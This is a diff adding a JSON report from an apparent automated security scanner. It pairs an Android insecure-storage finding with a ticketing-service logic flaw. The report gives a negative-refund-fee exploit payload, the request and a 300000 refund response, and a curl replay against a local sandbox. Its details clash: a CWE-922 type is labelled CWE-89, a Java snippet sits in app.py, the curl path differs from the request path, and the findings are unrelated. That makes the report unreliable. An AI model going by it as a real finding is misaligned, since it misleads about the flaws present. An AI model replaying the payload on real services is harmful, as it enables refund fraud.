@@ -1,0 +1,44 @@
+{
+  "tool": "aegis_ai",
+  "target_id": "TGT-089",
+  "static_findings": [
+    {
+      "rule_id": "SAST-MOB-001",
+      "target_type": "Android",
+      "title": "Android Insecure Shared Preferences Exposure (MODE_WORLD_READABLE)",
+      "severity": "HIGH",
+      "file_path": "app.py",
+      "code_snippet": "getSharedPreferences(\"user_session\", MODE_WORLD_READABLE)"
+    }
+  ],
+  "ml_prediction": {
+    "vulnerability_type": "Mobile Insecure Storage / Weak Keychain (CWE-922)",
+    "cwe_id": "CWE-89",
+    "severity": "HIGH",
+    "risk_score": 82,
+    "confidence": 0.94,
+    "fix_suggestion": "Use EncryptedSharedPreferences (Android) or kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly (iOS)"
+  },
+  "logic_scenario": {
+    "domain": "Ticketing Service",
+    "target_flow": "User -> Reservation -> Payment -> Cancel & Refund",
+    "vulnerability_detected": "Negative Refund Fee Double Payout",
+    "impact": "Critical financial asset loss via negative fee subtraction",
+    "exploit_payload": {
+      "ticket_id": "TKT-VIP-1029",
+      "original_price": 150000,
+      "refund_fee": -150000
+    }
+  },
+  "verified_evidence": {
+    "evidence_id": "EV-20260803-99182",
+    "timestamp_utc": "2026-08-03T15:11:57.000Z",
+    "sandbox_container_id": "cnt-sandbox-sbx-ticket-99812",
+    "sha256_hash": "f8f919f3af05679c73b8289ce7fdabff1be1197d552a33ed6b5f8e7204d0da60",
+    "request_packet": "POST /api/v1/tickets/cancel HTTP/1.1\nHost: 127.0.0.1:18090\nContent-Type: application/json\n\n{'ticket_id': 'TKT-VIP-1029', 'original_price': 150000, 'refund_fee': -150000}",
+    "response_packet": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"REFUND_APPROVED\", \"total_refund_amount\": 300000}",
+    "curl_replay": "curl -X POST 'http://127.0.0.1:18090/api/tgt-089' -H 'Content-Type: application/json' -d '{'ticket_id': 'TKT-VIP-1029', 'original_price': 150000, 'refund_fee': -150000}'",
+    "verdict": "HYPOTHESIS_PROVEN_REPRODUCIBLE"
+  },
+  "duration_seconds": 0.0
+}
